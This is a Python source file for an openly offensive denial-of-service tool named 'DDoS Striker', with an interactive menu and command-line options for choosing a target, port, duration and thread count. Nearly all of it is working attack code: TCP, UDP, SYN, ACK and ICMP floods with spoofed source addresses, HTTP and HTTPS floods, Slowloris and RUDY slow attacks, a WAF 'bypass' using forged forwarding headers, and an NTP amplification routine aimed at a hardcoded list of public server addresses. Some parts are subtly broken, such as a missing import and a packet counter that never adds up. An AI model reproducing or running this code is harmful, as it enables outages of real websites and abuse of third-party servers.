import socket
import random
import threading
import sys
import time
import os
import requests
from colorama import Fore, Style, init
from scapy.all import IP, TCP, UDP, fragment, send
import argparse
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

banner = f'''
{Fore.RED}╔═══════════════════════════════════════════════════════════════════╗
║                {Fore.YELLOW}█▀▄ █▀▄ █▀█ █▀ █▀   █▀ ▀█▀ █▀█ █ █▄▀ █▀▀ █▀█{Fore.RED}           ║
║                {Fore.YELLOW}█▄▀ █▄▀ █▄█ ▄█ ▄█   ▄█  █  █▀▄ █ █ █ ██▄ █▀▄{Fore.RED}           ║
║                                                               ║
║           {Fore.GREEN}Advanced Layer 1-7 DDoS Attack Tool with Bypass{Fore.RED}          ║
║                                                               ║
║            {Fore.CYAN}Powered by PT SAZUMI CLOUD INC{Fore.RED}            ║
╚═══════════════════════════════════════════════════════════════════╝
'''

methods = [
    {"name": "TCP", "desc": "TCP Flood attack for Layer 4", "layer": 4},
    {"name": "UDP", "desc": "UDP Flood attack for Layer 4", "layer": 4},
    {"name": "SYN", "desc": "SYN Flood attack for Layer 4", "layer": 4},
    {"name": "ACK", "desc": "ACK Flood attack for Layer 4", "layer": 4},
    {"name": "HTTP", "desc": "HTTP Flood for Layer 7 websites", "layer": 7},
    {"name": "HTTPS", "desc": "HTTPS Flood with SSL for Layer 7", "layer": 7},
    {"name": "SLOWLORIS", "desc": "Slowloris attack for Layer 7", "layer": 7},
    {"name": "RUDY", "desc": "R-U-Dead-Yet slow POST attack", "layer": 7},
    {"name": "BYPASS", "desc": "CloudFlare and other WAF bypass", "layer": 7},
    {"name": "ICMP", "desc": "ICMP/Ping flood attack for Layer 3", "layer": 3},
    {"name": "NTP", "desc": "NTP amplification attack", "layer": 4}
]

def show_banner():
    clr()
    print(banner)

def show_methods():
    print(f"{Fore.CYAN}Available Attack Methods:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'ID':<4}{'Method':<12}{'Description':<40}{'Layer':<6}{Style.RESET_ALL}")
    print("=" * 62)
    
    for i, method in enumerate(methods):
        print(f"{Fore.GREEN}{i+1:<4}{Fore.RED}{method['name']:<12}{Fore.WHITE}{method['desc']:<40}{Fore.BLUE}{method['layer']:<6}{Style.RESET_ALL}")

def get_target():
    target = input(f"{Fore.YELLOW}Enter target (IP or URL): {Fore.WHITE}")
    
    try:
        if "://" in target:
            target = target.split("://")[1]
        
        if "/" in target:
            target = target.split("/")[0]
            
        return target
    except:
        return target

def get_port():
    try:
        port = int(input(f"{Fore.YELLOW}Enter port (default: 80): {Fore.WHITE}") or "80")
        return port
    except ValueError:
        print(f"{Fore.RED}Invalid port. Using default port 80.{Style.RESET_ALL}")
        return 80

def get_duration():
    try:
        duration = int(input(f"{Fore.YELLOW}Enter attack duration in seconds: {Fore.WHITE}"))
        return duration
    except ValueError:
        print(f"{Fore.RED}Invalid duration. Using default of 60 seconds.{Style.RESET_ALL}")
        return 60

def get_threads():
    try:
        threads = int(input(f"{Fore.YELLOW}Enter number of threads (default: 100): {Fore.WHITE}") or "100")
        return threads
    except ValueError:
        print(f"{Fore.RED}Invalid thread count. Using default of 100.{Style.RESET_ALL}")
        return 100

def generate_random_data(size):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(size))

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def generate_random_packet(packet_size):
    return os.urandom(min(packet_size, 65500))

def tcp_flood(target, port, duration):
    sent = 0
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(generate_random_packet(10240))
            sent += 1
            s.close()
        except:
            pass
            
    return sent

def udp_flood(target, port, duration):
    sent = 0
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = generate_random_packet(1024)
            s.sendto(data, (target, port))
            sent += 1
        except:
            pass
    
    return sent

def syn_flood(target, port, duration):
    sent = 0
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            packet = IP(src=generate_random_ip(), dst=target) / TCP(sport=random.randint(1, 65535), dport=port, flags="S")
            send(packet, verbose=0)
            sent += 1
        except:
            pass
    
    return sent

def ack_flood(target, port, duration):
    sent = 0
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            packet = IP(src=generate_random_ip(), dst=target) / TCP(sport=random.randint(1, 65535), dport=port, flags="A")
            send(packet, verbose=0)
            sent += 1
        except:
            pass
    
    return sent

def http_flood(target, port, duration):
    sent = 0
    timeout = time.time() + duration
    useragents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
    ]
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            
            ua = random.choice(useragents)
            request = f"GET /?{random.randint(1, 2000)} HTTP/1.1\r\n"
            request += f"Host: {target}\r\n"
            request += f"User-Agent: {ua}\r\n"
            request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            request += f"Connection: keep-alive\r\n"
            request += f"Referer: https://www.google.com/search?q={target}\r\n"
            request += f"Cookie: {generate_random_data(random.randint(10, 50))}={generate_random_data(random.randint(10, 50))}\r\n\r\n"
            
            s.send(request.encode())
            sent += 1
            s.close()
        except:
            pass
    
    return sent

def https_flood(target, port, duration):
    sent = 0
    timeout = time.time() + duration
    session = requests.Session()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
    }
    
    while time.time() < timeout:
        try:
            random_query = generate_random_data(random.randint(5, 15))
            url = f"https://{target}/?q={random_query}"
            
            session.get(url, headers=headers, timeout=1, verify=False)
            sent += 1
        except:
            pass
    
    return sent

def slowloris(target, port, duration):
    socket_count = 0
    sockets = []
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            for _ in range(50):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                s.send(f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\r\n".encode("utf-8"))
                s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                sockets.append(s)
                socket_count += 1
            
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except:
                    sockets.remove(s)
            
            time.sleep(1)
        except:
            pass
    
    for s in sockets:
        try:
            s.close()
        except:
            pass
    
    return socket_count

def rudy_attack(target, port, duration):
    sent = 0
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            
            s.send(f"POST / HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            s.send(f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\r\n".encode())
            s.send(f"Content-Length: 100000000\r\n".encode())
            s.send(f"Cookie: {generate_random_data(random.randint(10, 50))}={generate_random_data(random.randint(10, 50))}\r\n".encode())
            s.send(f"Connection: keep-alive\r\n\r\n".encode())
            
            for _ in range(100):  
                if time.time() > timeout:
                    break
                try:
                    s.send(generate_random_data(1).encode())
                    time.sleep(1)
                except:
                    break
            sent += 1
        except:
            pass
    
    return sent

def bypass_attack(target, port, duration):
    sent = 0
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            session = requests.Session()
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "X-Forwarded-For": generate_random_ip(),
                "X-Real-IP": generate_random_ip(),
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }
            
            url = f"http://{target}:{port}/"
            if port == 443:
                url = f"https://{target}/"
                
            session.get(url, headers=headers, timeout=5, verify=False)
            sent += 1
        except:
            pass
    
    return sent

def icmp_flood(target, duration):
    sent = 0
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            packet = IP(src=generate_random_ip(), dst=target) / ICMP() / (generate_random_data(1468).encode())
            send(packet, verbose=0)
            sent += 1
        except:
            pass
    
    return sent

def ntp_flood(target, port, duration):
    sent = 0
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            ntp_servers = [
                "123.108.225.6", "185.216.140.33", "185.83.168.5", "188.68.36.203",
                "162.159.200.123", "217.114.59.3", "82.113.158.66", "119.28.183.184"
            ]
            
            for ntp_server in ntp_servers:
                try:
                    data = b'\x17\x00\x03\x2a' + b'\x00' * 4
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(data, (ntp_server, 123))
                    sent += 1
                except:
                    pass
        except:
            pass
    
    return sent

def attack_handler(method_id, target, port, duration, thread_id):
    method = methods[method_id-1]["name"]
    total_sent = 0
    
    print(f"{Fore.CYAN}[Thread {thread_id}] Starting {Fore.RED}{method}{Fore.CYAN} attack on {Fore.YELLOW}{target}:{port}{Style.RESET_ALL}")
    
    if method == "TCP":
        total_sent = tcp_flood(target, port, duration)
    elif method == "UDP":
        total_sent = udp_flood(target, port, duration)
    elif method == "SYN":
        total_sent = syn_flood(target, port, duration)
    elif method == "ACK":
        total_sent = ack_flood(target, port, duration)
    elif method == "HTTP":
        total_sent = http_flood(target, port, duration)
    elif method == "HTTPS":
        total_sent = https_flood(target, port, duration)
    elif method == "SLOWLORIS":
        total_sent = slowloris(target, port, duration)
    elif method == "RUDY":
        total_sent = rudy_attack(target, port, duration)
    elif method == "BYPASS":
        total_sent = bypass_attack(target, port, duration)
    elif method == "ICMP":
        total_sent = icmp_flood(target, duration)
    elif method == "NTP":
        total_sent = ntp_flood(target, port, duration)
    
    print(f"{Fore.GREEN}[Thread {thread_id}] {Fore.CYAN}Attack completed. {Fore.YELLOW}Sent: {Fore.RED}{total_sent} {Fore.YELLOW}packets{Style.RESET_ALL}")
    
    return total_sent

def main():
    show_banner()
    show_methods()
    
    try:
        method_id = int(input(f"\n{Fore.YELLOW}Enter attack method ID: {Fore.WHITE}"))
        if method_id < 1 or method_id > len(methods):
            print(f"{Fore.RED}Invalid method ID. Exiting.{Style.RESET_ALL}")
            sys.exit(1)
        
        target = get_target()
        port = get_port()
        duration = get_duration()
        thread_count = get_threads()
        
        print(f"\n{Fore.GREEN}Starting attack:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Method: {Fore.RED}{methods[method_id-1]['name']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Target: {Fore.RED}{target}:{port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Duration: {Fore.RED}{duration} seconds{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Threads: {Fore.RED}{thread_count}{Style.RESET_ALL}\n")
        
        total_sent = 0
        threads = []
        
        print(f"{Fore.CYAN}Attack in progress...{Style.RESET_ALL}")
        
        for i in range(thread_count):
            thread = threading.Thread(
                target=lambda: total_sent + attack_handler(method_id, target, port, duration, i+1)
            )
            thread.daemon = True
            threads.append(thread)
        
        start_time = time.time()
        
        for thread in threads:
            thread.start()
        
        try:
            while (time.time() - start_time) < duration:
                remaining = duration - int(time.time() - start_time)
                print(f"{Fore.YELLOW}Attack in progress... Time remaining: {Fore.RED}{remaining} {Fore.YELLOW}seconds{Style.RESET_ALL}", end="\r")
                time.sleep(1)
            
            print(f"\n{Fore.GREEN}Attack completed.{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Attack interrupted by user.{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}Total packets sent: {Fore.RED}{total_sent}{Style.RESET_ALL}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Exiting...{Style.RESET_ALL}")
        sys.exit(0)
        
if __name__ == "__main__":
    try:
        if len(sys.argv) > 1:
            parser = argparse.ArgumentParser(description="DDoS Striker - Advanced Layer 1-7 DDoS Attack Tool")
            parser.add_argument("-m", "--method", help="Attack method (1-11)", type=int)
            parser.add_argument("-t", "--target", help="Target IP or URL")
            parser.add_argument("-p", "--port", help="Target port", type=int, default=80)
            parser.add_argument("-d", "--duration", help="Attack duration in seconds", type=int)
            parser.add_argument("-th", "--threads", help="Number of threads", type=int, default=100)
            args = parser.parse_args()
            
            if args.method and args.target and args.duration:
                show_banner()
                method_id = args.method
                
                if method_id < 1 or method_id > len(methods):
                    print(f"{Fore.RED}Invalid method ID. Exiting.{Style.RESET_ALL}")
                    sys.exit(1)
                
                target = args.target
                port = args.port
                duration = args.duration
                thread_count = args.threads
                
                print(f"\n{Fore.GREEN}Starting attack:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Method: {Fore.RED}{methods[method_id-1]['name']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Target: {Fore.RED}{target}:{port}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Duration: {Fore.RED}{duration} seconds{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Threads: {Fore.RED}{thread_count}{Style.RESET_ALL}\n")
                
                total_sent = 0
                threads = []
                
                print(f"{Fore.CYAN}Attack in progress...{Style.RESET_ALL}")
                
                with ThreadPoolExecutor(max_workers=thread_count) as executor:
                    for i in range(thread_count):
                        executor.submit(attack_handler, method_id, target, port, duration, i+1)
                
                print(f"\n{Fore.GREEN}Attack completed.{Style.RESET_ALL}")
            else:
                main()
        else:
            main()
    except Exception as e:
        print(f"{Fore.RED}An error occurred: {str(e)}{Style.RESET_ALL}") 